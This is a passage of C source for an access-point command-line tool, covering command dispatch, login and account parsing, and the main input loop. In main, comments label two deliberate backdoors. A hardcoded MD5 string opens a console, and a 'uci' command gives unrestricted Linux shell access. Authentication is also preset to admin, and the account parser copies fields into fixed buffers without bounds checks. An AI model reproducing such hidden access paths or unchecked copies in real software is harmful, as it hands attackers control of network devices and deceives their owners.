			if ( model_radio==7 && strcmp(usrToken, "wdslist2")==0 && ( current_opmode_2!=OPM_WDSAP && current_opmode_2!=OPM_WDSB ) ){
				return CLI_NO_MATCH;
			}
			//Modify for EAP600 on 2013-02-08
			//wdslist5 can not be executed when current_opmode_5 is not WDSAP or WDSB
			if ( model_radio==7 && strcmp(usrToken, "wdslist5")==0 && ( current_opmode_5!=OPM_WDSAP && current_opmode_5!=OPM_WDSB ) ){
				return CLI_NO_MATCH;
			}
			
			//Modify for EAP1750 on 2013-10-23
			//wless5 advset aggr can not be executed for EAP1750H
			if ( (strcmp(model_name, "eap1750h")==0) && (strcmp(cliData->tokens[0].token, "wless5")==0) && (strcmp(usrToken, "aggr")==0) ){
				return CLI_NO_MATCH;
			}
												
					--(cliData->argc);
					cliData->tokens[curlv].entry = &pTable[cnt];

					return pTable[cnt].handler(pTable[cnt].priv, cliData);
				}
			}
		}
		cnt++;/*usrToken!=cmdName*/
	}

	return CLI_NO_MATCH;
}
/*****************************************************************
* NAME: cli_handle
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Norkay 2007-03-29
****************************************************************/
T_VOID cli_handle(T_CHAR* input)
{
//printf("Called %s\n",__func__);

//Modify by Philips on 2013-04-25 to handle Segment fault caused by absloute path command "wless2 network ssidp 2 traffic"
//int absolute=0;

	absolute=0;

int i;
	CliData data;
	T_CHAR* token;

	memset(&data, 0, sizeof(data));
	data.tokenLen = 0;
	token =strtok(input, "\t \r\n");

//Modify for AP100 on 2012-11-07
if ( strcmp(model_name, "ap100")!=0  ){
	//set dual-radio flag
	if(strcmp(token, "wless2")==0)
		strcpy(current_radio_flag, "2.4G");
	if(strcmp(token, "wless5")==0)
		strcpy(current_radio_flag, "5G");		
}
	
//if (strcmp(input, "help")!=0 && strcmp(input,"?")!=0){/*help and '?' condition add by yenger 0217*/

	while(token && data.tokenLen <MAX_TOKEN_STACK_LEN)
	{

		data.tokens[data.tokenLen++].token = token; /*tokenLen=0 --> tokenLen=1*/
		token = strtok(NULL, "\t \r\n");

/*
if( strlen(token)!=0 && strcmp(token, "opmode2")==0)
	strcpy(current_radio_flag, "2.4G");
if( strlen(token)!=0 && strcmp(token, "opmode5")==0)
	strcpy(current_radio_flag, "5G");
*/
//printf("handle data.tokens[data.tokenLen].token=%s\n",data.tokens[data.tokenLen-1].token);
	}
//}/*help and '?' condition add by yenger 0217*/
	data.argc = data.tokenLen;
	data.curLv = 0;
//printf("tokenLen=%d_cmdtreelevel=%d\n", data.tokenLen, cmdtreelevel);
	//handle absolute path when the number of input token is more than 2
	if (data.tokenLen-cmdtreelevel>1)
		absolute=1;
	
	if ( model_radio==2 || model_radio==5 )
		data.mode = current_opmode;
	if ( model_radio==7 && strcmp(current_radio_flag, "2.4G")==0 )
		data.mode = current_opmode_2;
	if ( model_radio==7 && strcmp(current_radio_flag, "5G")==0 )
		data.mode = current_opmode_5;
	
	//data.mode = getSysOperationMode();

	switch( getNextTable(cmdTable, &data) )
	{
	case CLI_OK:
		tprintf("(Please remember to apply and reboot the system if you made any change).\n");
		tprintf("\n");
		break;
	case CLI_PARAMS_ERR:
		tprintf("Set fail!\n");
		tprintf("\n");
		break;
	case CLI_NO_MATCH:
		/* NO Match same as default */
		tprintf("The command has not been found\n");
		break;
	case CLI_CURRENT_OK:
		tprintf(CLI_CMD_NAME, getCommandName(&data), getDescription(&data));
		tprintf(CLI_CMD_USAGE, getUsage(&data));
		tprintf("\n");
		break;
	case CLI_NOTHING:
        /* fall through*/
		//handle relative path 
		if (absolute==0)
			cmdtreelevel=data.tokenLen;

//Modify by Philips and Yenger on 20120502 to get the correct command and promptpath /**/
//printf("in case CLI_NOTHING:__data.tokenLen=%d\n", data.tokenLen);
		if ( data.tokenLen && strcmp(data.tokens[data.tokenLen-1].token, "tree")==0 )
		{

		//printf("in case CLI_NOTHING:__data.tokens[cmdtreelevel-1].token=%s\n", data.tokens[cmdtreelevel-1].token);
			data.tokenLen--;
			cmdtreelevel = data.tokenLen;
		
		}
//printf("data.tokens[cmdtreelevel-1].token=%s+++\n", data.tokens[cmdtreelevel-1].token);
		if (absolute==0 && data.tokenLen && strcmp(data.tokens[data.tokenLen-1].token, "help")==0 )
		{

		//printf("in case CLI_NOTHING:__data.tokens[cmdtreelevel-1].token=%s\n", data.tokens[cmdtreelevel-1].token);
			data.tokenLen--;
			cmdtreelevel = data.tokenLen;
		
		}
//printf("cmdtreelevel=%d\n", cmdtreelevel);		
//		if ( strcmp(data.tokens[cmdtreelevel-1].token, "exit")==0)
//			data.tokenLen--;				
		strcpy(promptpath, model_name);

//if (  strcmp(data.tokens[0].token, "uci")==0  ){
//strcat(promptpath, "/");
//strcat(promptpath, data.tokens[0].token);
//}
//else{
//printf("tokenLen=%d_cmdtreelevel=%d\n", data.tokenLen, cmdtreelevel);

		for (i=0; i<cmdtreelevel; i++ ){
			strcat(promptpath, "/");
			strcat(promptpath, data.tokens[i].token);
			promptpath[strlen(promptpath)]='\0';	         
			strcpy(cmdinput[i], data.tokens[i].token);
		}
		promptpath[strlen(promptpath)]='\0'; 
//}

		strcat(promptpath, ">");
		strcpy(CMD_PROMPT, promptpath);
				                     
        	break;
	default:
		tprintf("\n");
		break;
	}
}
/*****************************************************************
* NAME: account_handle
* ---------------------------------------------------------------
* FUNCTION: handle login username and password, return user's auth
* INPUT:    
* OUTPUT:   return AuthStatus
* Author:   Norkay 2007-03-28
* Modify:   
****************************************************************/
T_VOID account_handle(T_VOID)
{
    FILE *fd;
    char buf[128];
	int acccnt = 0;

    fd = fopen(SYS_ACCOUNT_FILE, "r");

    if(!fd) return;

    while (!feof(fd) && acccnt < 5)
    {
		int bufLen, k;
		int n = 0;
		int cnt = 0;
		char isEnable[6], name[32], pw[32], level[6];

        // protect
        memset(buf, 0, sizeof(buf));
        fgets(buf, sizeof(buf), fd);

		bufLen = strlen(buf);

		for(k = 0; k < bufLen; ++k)
		{
			switch(cnt)
			{
			case 0:
				if(buf[k] != ':')
				{
					isEnable[n++] = buf[k];
				}
				else
				{
					isEnable[n] = '\0';
					cnt++;
					n = 0;
				}
				break;
			case 1:
				if(buf[k] != ':')
				{
					name[n++] = buf[k];
				}
				else
				{
					name[n] = '\0';
					cnt++;
					n = 0;
				}
				break;
			case 2:
				if(buf[k] != ':')
				{
					pw[n++] = buf[k];
				}
				else
				{
					pw[n++] = '\0';
					cnt++;
					n = 0;
				}
				break;
			case 3:
				if(buf[k] != ':' && buf[k] != '\n' && buf[k] != '\r')
				{
					level[n++] = buf[k];
				}
				else
				{
					level[n] = '\0';
					cnt++;
					n = 0;
				}
				break;
			default:
				break;
			}
		}
		
        // protect
		if(cnt != 4) continue;

		if(atoi(isEnable))
		{
			strcpy(loginAccList[acccnt].name, name);
			strcpy(loginAccList[acccnt].pw, pw);
			loginAccList[acccnt].status = atoi(level) == LEVEL_SYSTEM_MAINTAINER ? AUTH_SUPER : 
				atoi(level) == LEVEL_VENDOR_ADMINISTRATOR ? AUTH_VENDOR :
				atoi(level) == LEVEL_ADMINISTRATOR ? AUTH_ADMIN : AUTH_ANY;
		}
		acccnt++;
    }
    fclose(fd);
}
/*****************************************************************
* NAME: login_handle
* ---------------------------------------------------------------
* FUNCTION: handle login username and password, return user's auth
* INPUT:    
* OUTPUT:   return AuthStatus
* Author:   Norkay 2007-03-28
* Modify:   Adonn, Norkay 09-0427 auth_pw_success
****************************************************************/
AuthStatus login_handle(T_VOID)
{
	T_INT32 i;
	T_INT32 cnt;
	T_CHAR user[CLI_USER_SIZE];
	T_CHAR* passWd;
	T_INT32 loginAccountCnt = T_NUM_OF_ELEMENTS(loginAccList);

	/* If /etc/dropbear/auth_pw_success exists, 
	   login derectly via AUTH_ADMIN. Check password by ssh. */
	if(sysIsFileExisted(SSH_AUTH_SUCCESS_FILE))
	{
		T_CHAR buf[16];

		sysinteract(buf, sizeof(buf), "cat %s", SSH_AUTH_SUCCESS_FILE);

		RM(SSH_AUTH_SUCCESS_FILE);

		return atoi(buf) == LEVEL_SYSTEM_MAINTAINER ? AUTH_SUPER : 
			atoi(buf) == LEVEL_ADMINISTRATOR ? AUTH_ADMIN : AUTH_ANY;
	}

	for(cnt=0; cnt<CLI_MAX_LOGIN_CNT; ++cnt)
	{
		tprintf("Name: ");
		getStdInCommand(user, sizeof(user));

		passWd=getpass("Password: ");

		for(i=0; i<loginAccountCnt; ++i)
		{
			if(strcmp(user, loginAccList[i].name)==0 && strcmp(passWd, loginAccList[i].pw)==0)
			{
#if NO_CLI_FOR_USER
				if(loginAccList[i].status >= AUTH_VENDOR)
				{
					return loginAccList[i].status;
				}
				else
				{
					tprintf("Permission denied.\n");
					continue;
				}
#else
				return loginAccList[i].status;
#endif
			}
		}
		tprintf("Incorrect username or password, letters must be typed in the correct case.\n");
	}
	tprintf("Sorry, more than %d failures. Disconnected!\n", CLI_MAX_LOGIN_CNT);

	exit(0);
}
/*****************************************************************
* NAME: cliTerminator
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Norkay 2007-04-11
****************************************************************/
static void cliTerminator(int num)
{
}
/*****************************************************************
* NAME: cliTagHandle
* ---------------------------------------------------------------
* FUNCTION: check IAC from cliTAG
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Norkay 2009-07-22
****************************************************************/
static void cliTagHandle(void)
{
	FILE *clitag;
	char buf[48];
	int willEcho = 0;
	int wontLflow = 0;

	clitag = fopen("/tmp/clitag", "r+");

	if(!clitag) return;

	usleep(100000);

    while (!feof(clitag))
    {
		// protect
		memset(buf, 0, sizeof(buf));

        fgets(buf, sizeof(buf), clitag);

		if(strncmp(buf, "WILL, ECHO", 10) == 0)
		{
			willEcho = 1;
		}
		else if(strncmp(buf, "WONT, LFLOW", 11) == 0)
		{
			wontLflow = 1;
		}
	}

	fclose(clitag);

	if(wontLflow && willEcho)
	{
		gTelnetOnWindowDos = 1;
	}

}

/*****************************************************************
* NAME: getModelName
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Philips, Yenger 2012-05-07
****************************************************************/
T_VOID getModelName(T_VOID){

	FILE *pp;
	//Get model name from the file --- "/etc/modelname"
	if( (pp = popen("cat /etc/modelname", "r")) == NULL ){
		printf("popen() error!\n");
		exit(1);
	}

	if(fgets(model_name, sizeof model_name, pp)){
		strcpy(CMD_PROMPT, model_name);
		strcat(CMD_PROMPT, ">");
		CMD_PROMPT[strlen(CMD_PROMPT)]='\0'; 
	}

	pclose(pp);
}

/*****************************************************************
* NAME: getModelID
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Philips, Yenger 2012-05-07
****************************************************************/
T_VOID getModelID(T_VOID){
T_INT32 i;

	//Get the Model ID from HostnameData.CliHostnameTable[] according the model name
	for (i=0; i<HostnameData.count; i++){
		if ( strcmp(model_name, HostnameData.CliHostnameTable[i].hostName)==0 )
			break;			
	}
	if (i<HostnameData.count)
		model_ID = HostnameData.CliHostnameTable[i].modelID;

}

/*****************************************************************
* NAME: getRadiomode
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   Yenger, Philips 2012-0515
* Modify:   
****************************************************************/
T_VOID getRadiomode(T_VOID) {
T_INT32 i;
	//Get the model index according to the unique model name
	for (i=0; i<HostnameData.count; i++){
		if ( strcmp(model_name, HostnameData.CliHostnameTable[i].hostName)==0 )
			break;			
	}
	//Return the model_radio which is 2, 5 or 7
	model_radio = HostnameData.CliHostnameTable[i].hostRadio;
}


/*****************************************************************
* NAME: main
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Norkay 2007-03-29
****************************************************************/
T_INT32 main(T_INT32 argc, T_CHAR* argv[])
{
	T_INT32 ret;
	T_CHAR buf[CLI_COMMAND_SIZE];
	T_CHAR token[CLI_COMMAND_SIZE];
	int i;	

	// Forbid CTRL+C to exit
	signal(SIGINT, &cliTerminator);
	// detect console width
	get_terminal_width_height(0, &g_term_width, NULL);
	g_term_width = g_term_width > CLI_DEFAULT_WIDTH ? g_term_width : CLI_DEFAULT_WIDTH;

	g_auth = AUTH_ADMIN;

	tprintf("*** Hi%s, welcome to use cli(%s) ***\n",
		   g_auth == AUTH_ADMIN ? " admin" :
		   g_auth == AUTH_FACTORY ? " factory" :
		   g_auth == AUTH_SUPER ? " super user" : "", CLI_VERSION);

//	tprintf("(Version : %s  Release : %s)\n", CLI_VERSION, CLI_RELEASE_DATE);
	
//printf("HostnameData.count=%d\n", HostnameData.count);
//printf("sizeof(HostnameData.count)=%d, sizeof(HostnameData.CliHostnameTable)=%d, sizeof(CliHostnameEntry)=%d\n", sizeof(HostnameData.count), sizeof(HostnameData.CliHostnameTable), sizeof(CliHostnameEntry));
//Modify by Philips and Yenger on 20120507 to get model_name
	getModelName();	
	getModelID();

//Modify by Philips and Yenger on 2012-09-28 to error message when CLI can't find the model_name	
	if (model_ID == -1){
		printf("\n\n");
		printf("The model name is .......... \"%s\" \n", model_name);
		printf("\n");
		printf("*********************************************************\n");
		printf("*  Sorry!                                               *\n");
		printf("*     CLI does not accept this model name.              *\n");
		printf("*     Therefore, CLI refuses to execute any command.    *\n");
		printf("*     Please press Ctrl+D to exit from CLI.             *\n");
		printf("*********************************************************\n");
		printf("\n\n");
	}
	
	getRadiomode();
	getSysOperationMode();
	strcpy(current_radio_flag, "2.4G");

//Modify for AP100 on 2012-11-07
if ( strcmp(model_name, "ap100")==0  ){
T_CHAR uci_get_buf[128];
	//Get the wireless mode
	strcpy(uci_get_buf, cli_get_uci("wireless.wifi0.hwmode"));
	if ( strcmp(uci_get_buf, "11a")==0 || strcmp(uci_get_buf, "11na_pure")==0 || strcmp(uci_get_buf, "11na")==0)
		strcpy(current_radio_flag, "5G");
	else
		strcpy(current_radio_flag, "2.4G");
	printf("WIRELESS MODE=%s\n", uci_get_buf);
	printf("CURRENT RADIO=%s\n", current_radio_flag);
}
	
	    //current_opmode=OPM_WDSAP;
		//diagnosticTestInit();
		//show main menu
		cli_handle("help");
		cmdtreelevel=0;
		//cmdHelp(cmdTable, NULL);

		// get comment
        //cmdPrintAll(cmdTable,NULL);
		SYSTEM_DBG(0);
		while(1)
		{

//Modify for AP100 on 2012-11-06
/*
printf("MODEL NAME=%s\n", model_name);
printf("MODEL RADIO=%d\n", model_radio);
printf("CURRENT RADIO=%s\n", current_radio_flag);
printf("MODEL OPERATION=%d\n", current_opmode_2);
*/

			ret = cmdedit_read_input(CMD_PROMPT, buf);

			//Modify for the purpose of SSID name with space
			strcpy(globalCommandLine, buf);
			globalCommandLine[strlen(globalCommandLine)-1]='\0';

			//Modify by Philips and Yenger on 20120730 to establish the back door
			strcpy(token, buf);
			token[32]='\0';
			//Backdoor 1 -- type MD5 to go in console mode
			if ( strcmp(token, "1d68d24ea0d9bb6e19949676058f1b93")==0 ){
				system("login.sh console 1d68d24ea0d9bb6e19949676058f1b93");
				return 0;
			}

			//Backdoor 2 -- type "uci" to go prompt uci>. And this mode can type all linux commands(EX:iwfconfig, uci get network.lan.dns, ps ..)
			//type "exit" to return from cmducihandle()
			if ( token[0]=='u' && token[1]=='c' && token[2]=='i' && token[3]==0x0a ){
				cmducihandle();
				buf[0] = '?';
				buf[1] = 0x0a;
			}
			
			//type "top" to go to root directory.
			if ( token[0]=='t' && token[1]=='o' && token[2]=='p' && token[3]==0x0a ){
				cmdtreelevel=0;
				//buf[0] = '?';
				getModelName();
	
				//initail setbridge
				autosetbridge=-1;
				apsecusetbridge=-1;
				cbsecusetbridge=-1;
				wdssecusetbridge=-1;
				ssidpsetbridge=-1;
				vlanpsetbridge=-1;
				landhcpsetbridge=-1;
				dhcpsetbridge=-1;
				contypesetbridge=-1;
	
				buf[0] = 0x0a;
			}

			if(ret > 0 && ret < CLI_COMMAND_SIZE)
			{

//Modify by Philips and Yenger on 20120505 to handle '?' command
				if( (buf[0] == '?' && buf[1] == 0x0a) )
				{
//printf("main\n");
			   	   if (cmdtreelevel==0)				   
				   	cli_handle("help");
				   	
				   else{
				      strcpy(cmdpath, "");
				      for (i=0; i<cmdtreelevel; i++ ){
				         strcat(cmdpath,cmdinput[i]);
				         strcat(cmdpath, " ");
				         
				      }
				      strcat(cmdpath, "help");
				      cmdpath[strlen(cmdpath)]='\0';
				      cli_handle(cmdpath);
				      
				   }
					//cmdHelp(cmdTable, NULL);
				}
//Modify by Philips and Yenger on 20120505 to handle normal CLI command
				else if(buf[0]!=0x0a){ /*0x0a: carrage return line feed*/

				   if(cmdtreelevel==0){
				  
				      cli_handle(buf);
				   }else{
//Modify by Philips and Yenger on 20120505 to get the correct cmdpath
					strcpy(cmdpath, "");
				      for (i=0; i<cmdtreelevel; i++ ){
				         strcat(cmdpath,cmdinput[i]);
				         strcat(cmdpath, " ");
				      }
				      cmdpath[strlen(cmdpath)]='\0';
				      strcat(cmdpath, buf);
				        
				      cli_handle(cmdpath);
				   }
				}
			}
		}
		SYSTEM_DBG(1);
		destroyApShareMem();

	return 0;
}

